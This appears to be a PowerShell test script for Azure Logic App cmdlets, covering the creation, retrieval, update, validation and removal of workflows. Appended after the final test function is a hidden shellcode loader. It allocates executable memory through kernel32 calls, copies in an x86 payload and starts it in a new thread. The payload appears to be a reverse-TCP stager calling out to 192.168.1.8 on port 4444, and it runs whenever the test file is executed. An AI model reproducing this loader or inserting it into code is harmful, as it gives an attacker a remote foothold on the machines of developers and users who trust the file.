














function Test-CreateAndRemoveLogicApp
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$parameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"

	
	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath
	
	Assert-NotNull $workflow
	Assert-NotNull $workflow.Definition
	Assert-NotNull $workflow.Parameters
	Assert-AreEqual $workflowName $workflow.Name 
	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $WorkflowName -Force

	
	$parameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"
    $definition = [IO.File]::ReadAllText((Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"))

	$workflowName = getAssetname
	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Definition $definition -ParameterFilePath $parameterFilePath -Location $location

	Assert-NotNull $workflow
	Assert-NotNull $workflow.Definition
	Assert-NotNull $workflow.Parameters
	Assert-AreEqual $workflowName $workflow.Name 
	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $WorkflowName -Force

	
	$workflowName = getAssetname
	$workflow = $resourceGroup | New-AzLogicApp -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath

	Assert-NotNull $workflow
	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $WorkflowName -Force
}


function Test-CreateLogicAppWithDuplicateName
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$parameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"
	$resourceGroupName = $resourceGroup.ResourceGroupName

	$workflow = $resourceGroup | New-AzLogicApp -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath

	Assert-NotNull $workflow
	try
	{
		$workflow = $resourceGroup | New-AzLogicApp -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath
	}
	catch
	{
		Assert-AreEqual $_.Exception.Message "The Resource '$WorkflowName' under resource group '$resourceGroupName' already exists."
	}
	
	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $WorkflowName -Force
}


function Test-CreateLogicAppUsingInputfromWorkflowObject
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$newWorkflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$parameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"

	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath 
	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroupName -Name $newWorkflowName -Location $location -Definition $workflow.Definition -Parameters $workflow.Parameters

	Assert-NotNull $workflow
	Assert-NotNull $workflow.Definition
	Assert-NotNull $workflow.Parameters
	Assert-AreEqual $newWorkflowName $workflow.Name 
	Assert-AreEqual "Enabled" $workflow.State

	Remove-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Force
}


function Test-CreateLogicAppUsingInputParameterAsHashTable
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"	
	$parameters = @{destinationUri="http://www.bing.com"}

	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $definitionFilePath -Parameters $parameters -Location $location

	Assert-NotNull $workflow
	Assert-NotNull $workflow.Parameters

	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $WorkflowName -Force	
}


function Test-CreateLogicAppUsingDefinitionWithTriggers
{		
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowTriggerDefinition.json"
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $definitionFilePath -Location $location

	Assert-NotNull $workflow
	
	[int]$counter = 0
	do {
		SleepInRecordMode 2000
		$workflow =  Get-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName
	} while ($workflow.State -ne "Enabled" -and $counter++ -lt 5)
	
	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Force
}


function Test-CreateAndGetLogicAppUsingDefinitionWithActions
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowActionDefinition.json"
	
	
	$workflow1 = New-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $definitionFilePath -Location $location
	Assert-NotNull $workflow1

	
	$workflow2 = Get-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName
	Assert-NotNull $workflow2

	
	$workflow3 = Get-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Version $workflow1.Version
	Assert-NotNull $workflow3

	
	$workflow4 = Get-AzLogicApp -ResourceGroupName $resourceGroupName
	Assert-NotNull $workflow4
	Assert-True { $workflow4.Length -ge 1 }

	
	$workflow5 = Get-AzLogicApp
	Assert-NotNull $workflow5
	Assert-True { $workflow5.Length -ge 1 }

	
	$workflow6 = Get-AzLogicApp -Name $workflowName
	Assert-NotNull $workflow6
	Assert-True { $workflow6.Length -ge 1 }

	
	try
	{
		Get-AzLogicApp -ResourceGroupName $resourceGroupName -Name "InvalidWorkflow"
	}
	catch
	{
		Assert-AreEqual $_.Exception.Message "The Resource 'Microsoft.Logic/workflows/InvalidWorkflow' under resource group '$resourceGroupName' was not found."
	} 

	Remove-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Force
}


function Test-RemoveNonExistingLogicApp
{
	$WorkflowName = "09e81ac4-848a-428d-82a6-7d61953e3940"
	$resourceGroup = TestSetup-CreateResourceGroup
	$resourceGroupName = $resourceGroup.ResourceGroupName

	Remove-AzLogicApp -ResourceGroupName $resourceGroupName -Name $WorkflowName -Force
}


function Test-UpdateLogicApp
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$simpleDefinitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$simpleParameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"
	$workflow = $resourceGroup | New-AzLogicApp -Name $workflowName -Location $location -DefinitionFilePath $simpleDefinitionFilePath -ParameterFilePath $simpleParameterFilePath

	Assert-NotNull $workflow

	
	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowTriggerDefinition.json"

	$UpdatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -State "Disabled" -DefinitionFilePath $definitionFilePath -Parameters $null -Force
	
	Assert-NotNull $UpdatedWorkflow
	Assert-AreEqual $UpdatedWorkflow.State "Disabled"

	
	$UpdatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $simpleDefinitionFilePath -ParameterFilePath $simpleParameterFilePath -Force

	Assert-NotNull $UpdatedWorkflow

	
	$UpdatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -State "Enabled" -Force
	
	Assert-NotNull $UpdatedWorkflow
	Assert-AreEqual $UpdatedWorkflow.State "Enabled"

	
	try
	{
		$UpdatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Definition $null -Force
	}
	catch
	{
		Assert-AreEqual $_.Exception.Message "Definition content needs to be specified."
	}

	
	try
	{
		$workflowName = "82D2D842-C312-445C-8A4D-E3EE9542436D"
		$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowTriggerDefinition.json"
		Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $definitionFilePath -Force
	}
	catch
	{
		Assert-AreEqual $_.Exception.Message "The Resource 'Microsoft.Logic/workflows/$workflowName' under resource group '$resourceGroupName' was not found."		
	}
}


function Test-ValidateLogicApp
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$parameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"

	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath

	
	Test-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath
	
	
	$definition = [IO.File]::ReadAllText($definitionFilePath)
	Test-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Location $location -Definition $definition -ParameterFilePath $parameterFilePath

	
	try
	{
		Test-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Location $location -Definition '{}'
	}
	catch
	{
		Assert-AreEqual $_.Exception.Message "The request content is not valid and could not be deserialized: 'Required property '`$schema' not found in JSON. Path 'properties.definition', line 4, position 20.'."
	}

	Remove-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Force
}


function Test-GetUpgradedDefinitionForLogicApp
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"

	$definitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$parameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"

	$workflow = New-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath

	
	$upgradedDefinition = Get-AzLogicAppUpgradedDefinition -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -TargetSchemaVersion "2016-06-01"
	
	
	Set-AzLogicApp -ResourceGroupName $resourceGroup.ResourceGroupName -Name $workflowName -Definition $upgradedDefinition.ToString() -Force

	Remove-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -Force	
}


function Test-UpdateLogicAppWithIntegrationAccount
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$workflowName = getAssetname
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"
	$resourceGroupName = $resourceGroup.ResourceGroupName
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName

	$simpleDefinitionFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowDefinition.json"
	$simpleParameterFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "TestSimpleWorkflowParameter.json"
	$workflow = $resourceGroup | New-AzLogicApp -Name $workflowName -Location $location -DefinitionFilePath $simpleDefinitionFilePath -ParameterFilePath $simpleParameterFilePath -IntegrationAccountId $integrationAccount.Id
	Assert-NotNull $workflow

	$updatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $simpleDefinitionFilePath -ParameterFilePath $simpleParameterFilePath -IntegrationAccountId $integrationAccount.Id -Force
	Assert-AreEqual $integrationAccount.Id $updatedWorkflow.IntegrationAccount.Id

	$updatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $simpleDefinitionFilePath -ParameterFilePath $simpleParameterFilePath -Force
	Assert-AreEqual $integrationAccount.Id $updatedWorkflow.IntegrationAccount.Id

	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName
	$updatedWorkflow = Set-AzLogicApp -ResourceGroupName $resourceGroupName -Name $workflowName -DefinitionFilePath $simpleDefinitionFilePath -ParameterFilePath $simpleParameterFilePath -IntegrationAccountId $integrationAccount.Id -Force
	Assert-AreEqual $integrationAccount.Id $updatedWorkflow.IntegrationAccount.Id

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

